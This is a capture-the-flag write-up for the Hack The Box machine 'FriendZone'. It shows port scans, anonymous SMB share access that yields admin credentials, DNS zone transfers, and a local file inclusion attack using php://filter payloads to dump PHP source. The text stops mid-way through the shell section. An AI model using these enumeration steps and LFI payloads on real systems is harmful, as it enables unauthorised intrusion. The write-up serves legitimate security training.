I"üÓ<h1 id="htb-friendzone-101010123-machine-write-up"><span style="color:red">HTB FriendZone (10.10.10.123) MACHINE WRITE-UP</span></h1>

<hr />

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<ul>
  <li><a href="#part-1--initial-recon">PART 1 : INITIAL RECON</a></li>
  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a></li>
  <li><a href="#part-3--generate-user-shell">PART 3 : GENERATE USER SHELL</a></li>
  <li><a href="#part-4--privilege-escalation-friend---root">PART 4 : PRIVILEGE ESCALATION (friend -&gt; root)</a></li>
</ul>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap --min-rate 1000 -p- -v 10.10.10.123
</span></code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
</code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -oN friendzone -p21,22,53,80,139,445 -sC -sV -v 10.10.10.123
</span></code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m59s, deviation: 1h43m54s, median: 0s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   FRIENDZONE&lt;00&gt;       Flags: &lt;unique&gt;&lt;active&gt;
|   FRIENDZONE&lt;03&gt;       Flags: &lt;unique&gt;&lt;active&gt;
|   FRIENDZONE&lt;20&gt;       Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-04-16T08:46:11+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-04-16 13:46:11
|_  start_date: N/A
</code></pre></div></div>
<p><strong>NOTE(S)</strong>:</p>
<ul>
  <li>There is an FTP, SSH, DNS, HTTP, HTTPS, and SMB service available</li>
  <li>The FTP service does not allow anonymous logins</li>
</ul>

<hr />
<h2 id="part-2--port-enumeration">PART 2 : Port Enumeration</h2>

<ol>
  <li>Explore <strong>SMB</strong> service
    <ol>
      <li>Enumeration
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">enum4linux -a 10.10.10.123
</span></code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...

 ====================================================
|    Enumerating Workgroup/Domain on 10.10.10.123    |
 ====================================================
[+] Got domain/workgroup name: WORKGROUP

...

 =====================================
|    Session Check on 10.10.10.123    |
 =====================================
[+] Server 10.10.10.123 allows sessions using username '', password ''

...

 =========================================
|    Share Enumeration on 10.10.10.123    |
 =========================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE

[+] Attempting to map shares on 10.10.10.123
//10.10.10.123/print$           Mapping: DENIED, Listing: N/A
//10.10.10.123/Files            Mapping: DENIED, Listing: N/A
//10.10.10.123/general          Mapping: OK, Listing: OK
//10.10.10.123/Development      Mapping: OK, Listing: OK
//10.10.10.123/IPC$             [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

...
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>Workgroup name is <strong>WORKGROUP</strong></li>
          <li><strong>/etc/Files</strong> was listed as comment for <strong>Files</strong> share</li>
          <li><strong>general</strong> and <strong>Development</strong> shares does not require authentication
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Explore available <strong>shares</strong>
        <ol>
          <li>//10.10.10.123/general
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">smbclient \\\\WORKGROUP\\general -I 10.10.10.123 -N
</span></code></pre></div>            </div>
            <ul>
              <li>While inside the client:
                <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">dir     
</span><span class="gp">#</span><span class="w"> </span>creds.txt      N     57  Wed Oct 10 07:52:42 2018
<span class="go">           
get creds.txt
</span></code></pre></div>                </div>
              </li>
              <li><strong>creds.txt</strong> contents:
                <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>creds for the admin THING:

admin:WORKWORKHhallelujah@#
</code></pre></div>                </div>
              </li>
            </ul>
          </li>
          <li>//10.10.10.123/Development
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">smbclient \\\\WORKGROUP\\Development -I 10.10.10.123 -N
</span></code></pre></div>            </div>
            <ul>
              <li>While inside the client:
                <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">dir
</span><span class="gp">#</span><span class="w"> </span><span class="nb">.</span>              D      0  Thu Jan 17 04:03:49 2019
<span class="gp">#</span><span class="w"> </span>..             D      0  Thu Jan 24 05:51:02 2019
</code></pre></div>                </div>
              </li>
            </ul>
          </li>
        </ol>

        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li><strong>general</strong> share contains <strong>admin credentials</strong></li>
          <li><strong>Development</strong> share is <strong>empty</strong>
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ol>
  </li>
  <li>Visit http://10.10.10.123
    <ul>
      <li>Page Source:
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>Friend Zone Escape software<span class="nt">&lt;/title&gt;</span>

<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Have you ever been friendzoned ?<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>

<span class="nt">&lt;center&gt;&lt;img</span> <span class="na">src=</span><span class="s">"fz.jpg"</span><span class="nt">&gt;&lt;/center&gt;</span>

<span class="nt">&lt;center&gt;&lt;h2&gt;</span>if yes, try to get out of this zone ;)<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>

<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Call us at : +999999999<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>

<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Email us at: info@friendzoneportal.red<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li><strong>friendzoneportal.red</strong> is a domain name
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Do a DNS lookup for <strong>friendzoneportal.red</strong> with <em>zone transfer</em>
    <ol>
      <li>Enumeration:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">dig @10.10.10.123 friendzoneportal.red axfr
      
</span><span class="gp">#</span><span class="w"> </span>friendzoneportal.red.         604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
<span class="gp">#</span><span class="w"> </span>friendzoneportal.red.         604800  IN     AAAA    ::1
<span class="gp">#</span><span class="w"> </span>friendzoneportal.red.         604800  IN     NS      localhost.
<span class="gp">#</span><span class="w"> </span>friendzoneportal.red.         604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>admin.friendzoneportal.red.   604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>files.friendzoneportal.red.   604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>imports.friendzoneportal.red. 604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>vpn.friendzoneportal.red.     604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>friendzoneportal.red.         604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
</code></pre></div>        </div>
      </li>
      <li>Add <em>subdomains</em> to <strong>/etc/hosts</strong>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
127.0.1.1       kali f
10.10.10.123    friendzoneportal.red
10.10.10.123    admin.friendzoneportal.red
10.10.10.123    files.friendzoneportal.red    \\\DEAD END
10.10.10.123    imports.friendzoneportal.red  \\\DEAD END
10.10.10.123    vpn.friendzoneportal.red      \\\DEAD END

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div>        </div>
      </li>
    </ol>
  </li>
  <li>Visit http://admin.friendzoneportal.red
    <ul>
      <li>Loads homepage of http://10.10.10.123
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Visit http://10.10.10.123:443
    <ul>
      <li>HTTP Response
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Bad Request<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>Your browser sent a request that this server could not understand.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
Reason: You're speaking plain HTTP to an SSL-enabled server port.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
Instead use the HTTPS scheme to access this URL, please.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;hr&gt;</span>
<span class="nt">&lt;address&gt;</span>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 443<span class="nt">&lt;/address&gt;</span>
</code></pre></div>        </div>
      </li>
      <li>Switch to https://10.10.10.123</li>
      <li>Check SSL Certificate
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">openssl s_client -connect 10.10.10.123:443 -quiet
</span></code></pre></div>        </div>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
verify error:num=18:self signed certificate
verify return:1
depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
verify error:num=10:certificate has expired
notAfter=Nov  4 21:02:30 2018 GMT
verify return:1
depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
notAfter=Nov  4 21:02:30 2018 GMT
verify return:1

HTTP/1.1 400 Bad Request
Date: Tue, 16 Apr 2019 08:57:42 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 302
Connection: close
Content-Type: text/html; charset=iso-8859-1

<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>
<span class="nt">&lt;html&gt;&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>400 Bad Request<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;&lt;body&gt;</span>
<span class="nt">&lt;h1&gt;</span>Bad Request<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>Your browser sent a request that this server could not understand.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;hr&gt;</span>
<span class="nt">&lt;address&gt;</span>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 443<span class="nt">&lt;/address&gt;</span>
<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li><strong>friendzone.red</strong> is another <em>domain name</em></li>
          <li>Try accessing subdomains over <strong>https</strong>
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Visit https://admin.friendzoneportal.red
    <ul>
      <li>Page Source:
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>Admin Page<span class="nt">&lt;/title&gt;</span>

<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Login and break some friendzones !<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>

<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Spread the love !<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>

<span class="nt">&lt;center&gt;</span>
<span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"login"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"login.php"</span><span class="nt">&gt;</span>

<span class="nt">&lt;p&gt;</span>Username : <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span><span class="nt">&gt;&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>Password : <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span><span class="nt">&gt;&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Login"</span><span class="nt">&gt;&lt;/p&gt;</span>

<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/center&gt;</span>
</code></pre></div>        </div>
      </li>
      <li>Response after successful logging using credentials from <strong>creds.txt</strong>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Admin page is not developed yet !!! check for another one<span class="nt">&lt;/h1&gt;</span>
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
      </li>
      <li>Maybe there is another admin page in <strong>friendzone.red</strong>
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Do a DNS lookup for <strong>friendzone.red</strong> with <em>zone transfer</em>
    <ol>
      <li>Enumeration:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">dig @10.10.10.123 friendzone.red axfr
    
</span><span class="gp">#</span><span class="w"> </span>friendzone.red.                 604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
<span class="gp">#</span><span class="w"> </span>friendzone.red.                 604800  IN     AAAA    ::1
<span class="gp">#</span><span class="w"> </span>friendzone.red.                 604800  IN     NS      localhost.
<span class="gp">#</span><span class="w"> </span>friendzone.red.                 604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>administrator1.friendzone.red.  604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>hr.friendzone.red.              604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>uploads.friendzone.red.         604800  IN     A       127.0.0.1
<span class="gp">#</span><span class="w"> </span>friendzone.red.                 604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
</code></pre></div>        </div>
      </li>
      <li>Add <em>subdomains</em> to <strong>/etc/hosts</strong>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
127.0.1.1       kali f
10.10.10.123    friendzone.red
10.10.10.123    administrator1.friendzone.red
10.10.10.123    hr.friendzone.red             \\\DEAD END
10.10.10.123    uploads.friendzone.red        

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div>        </div>
      </li>
    </ol>
  </li>
  <li>Visit https://administrator1.friendzone.red
    <ul>
      <li>Snippet from Page Source:
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"login.php"</span> <span class="na">name=</span><span class="s">"Login"</span> <span class="na">class=</span><span class="s">"login-form"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">placeholder=</span><span class="s">"username"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"password"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;button&gt;</span>login<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div>        </div>
      </li>
      <li>Response after successful logging using credentials from <strong>creds.txt</strong>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Login Done ! visit /dashboard.php
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>Go to https://administrator1.friendzone.red/dashboard.php
    <ul>
      <li>Page Source:
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>FriendZone Admin !<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Smart photo script for friendzone corp !<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h3&gt;</span>* Note : we are dealing with a beginner php developer and the application is not tested yet !<span class="nt">&lt;/h3&gt;&lt;/center&gt;</span>        
<span class="nt">&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;&lt;p&gt;</span>image_name param is missed !<span class="nt">&lt;/p&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;p&gt;</span>please enter it to show the image<span class="nt">&lt;/p&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;p&gt;</span>default is image_id=a.jpg<span class="err">&amp;</span>pagename=timestamp<span class="nt">&lt;/p&gt;&lt;/center&gt;</span>
</code></pre></div>        </div>
      </li>
      <li><strong>/dashboard.php?image_id=a.jpg&amp;pagename=timestamp</strong>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>FriendZone Admin !<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Smart photo script for friendzone corp !<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h3&gt;</span>* Note : we are dealing with a beginner php developer and the application is not tested yet !<span class="nt">&lt;/h3&gt;&lt;/center&gt;</span>  
<span class="nt">&lt;center&gt;</span>
  <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'images/a.jpg'</span><span class="nt">&gt;&lt;/center&gt;&lt;center&gt;</span>
  <span class="nt">&lt;h1&gt;</span>Something went worng ! , the script include wrong param !<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;/center&gt;</span>
Final Access timestamp is 1555410914
</code></pre></div>        </div>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The <strong>image_id</strong> parameter is loaded from a directory <strong>images/</strong></li>
      <li>The <strong>pagename</strong> parameter might be exploitable</li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="part-3--generate-user-shell">PART 3 : GENERATE USER SHELL</h2>

<ol>
  <li>Exploit <strong>pagename</strong> parameter from https://administrator1.friendzone.red/dashboard.php
    <ul>
      <li>Attempt LFI using <strong>php://filter</strong>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=timestamp
</code></pre></div>        </div>
        <p>Page Source:</p>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>FriendZone Admin !<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Smart photo script for friendzone corp !<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h3&gt;</span>* Note : we are dealing with a beginner php developer and the application is not tested yet !<span class="nt">&lt;/h3&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;img</span> <span class="na">src=</span><span class="s">'images/a.jpg'</span><span class="nt">&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Something went worng ! , the script include wrong param !<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=
</code></pre></div>        </div>
        <p>Decoding the <strong>base64</strong> output:</p>
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">echo PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo= | base64 --decode
</span></code></pre></div>        </div>
        <p>The source code for <strong>timestamp.php</strong> appears:</p>
        <pre><code class="language-PHP">&lt;?php


$time_final = time() + 3600;

echo "Final Access timestamp is $time_final";


?&gt;
</code></pre>
      </li>
      <li>Now try reading other files (e.g. dashboard.php)
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=dashboard
</code></pre></div>        </div>
        <p>Page Source:</p>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>FriendZone Admin !<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Smart photo script for friendzone corp !<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h3&gt;</span>* Note : we are dealing with a beginner php developer and the application is not tested yet !<span class="nt">&lt;/h3&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;img</span> <span class="na">src=</span><span class="s">'images/a.jpg'</span><span class="nt">&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Something went worng ! , the script include wrong param !<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=
</code></pre></div>        </div>
        <p>Decoding the <strong>base64</strong> output:</p>
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">echo PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2